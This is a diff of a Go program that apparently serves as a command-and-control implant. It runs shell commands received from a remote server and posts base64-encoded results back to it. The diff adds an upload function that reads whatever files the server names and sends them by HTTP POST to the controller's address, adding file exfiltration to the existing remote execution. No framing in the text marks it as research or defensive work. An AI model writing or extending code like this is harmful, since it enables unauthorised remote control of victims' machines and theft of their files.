@@ -1,22 +1,26 @@
 package main
 
 import (
-	"fmt"
-	"time"
-	"log"
+	"os"
 	"io"
+	"fmt"
+	"log"
+	"time"
 	"net"
+	"bytes"
 	"errors"
 	"strings"
 	"os/exec"
 	"net/http"
 	"math/rand"
 	"encoding/json"
+	"mime/multipart"
 	b64 "encoding/base64"
 )
 
 type CommandResponse struct {
 	Exec []string
+	Download []string
 }
 
 type CommandUpdate struct {
@@ -36,7 +40,7 @@ var cmdHost string
 var id string
 var ip string
 var queryData string
-var debug bool = false
+var debug bool = true
 var netClient = &http.Client{
 	Timeout: time.Second * 10,
 }
@@ -65,9 +69,12 @@ func handleCommandResponse(commResp CommandResponse) {
 			data, err := json.Marshal(CommandUpdate{ip,id,"exec",string(out)})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
-			fmt.Println(encoded)
 			queryCommandHttp(encoded)
 		}
+	}
+
+	for _, file := range commResp.Download {
+		upload(file)
 	}
 }
 
@@ -133,7 +140,6 @@ func externalIP() (string, error) {
 	return "", errors.New("not connected")
 }
 
-
 func genRandID() string {
 	rand.Seed(time.Now().UTC().UnixNano())
     b := make([]byte, idLen)
@@ -143,6 +149,45 @@ func genRandID() string {
     }
     
 	return string(b)
+}
+
+func upload(filename string) {
+	data, err := json.Marshal(CommandUpdate{ip,id,"upload",filename})
+	debugFatal(err)
+	
+	if err != nil {
+		return
+	}
+
+	encoded := b64.StdEncoding.EncodeToString(data)
+	url := "http://" + cmdAddress + ":" + cmdPort + "/" + encoded
+	
+    var b bytes.Buffer
+    w := multipart.NewWriter(&b)
+    var fw io.Writer
+    file, err := os.Open(filename)
+    debugFatal(err)
+	
+	if err != nil {
+		return
+	}
+	if fw, err = w.CreateFormFile("file", file.Name()); err != nil {
+    	debugFatal(err)
+		return
+    }    
+	if _, err = io.Copy(fw, file); err != nil {
+		debugFatal(err)
+		return
+    }
+
+    w.Close()
+
+	req, err := http.NewRequest("POST", url, &b)
+	req.Host = cmdHost
+	debugFatal(err)
+	req.Header.Set("Content-Type", w.FormDataContentType())
+    _, err = netClient.Do(req)
+	debugFatal(err)
 }
 
 func main() {
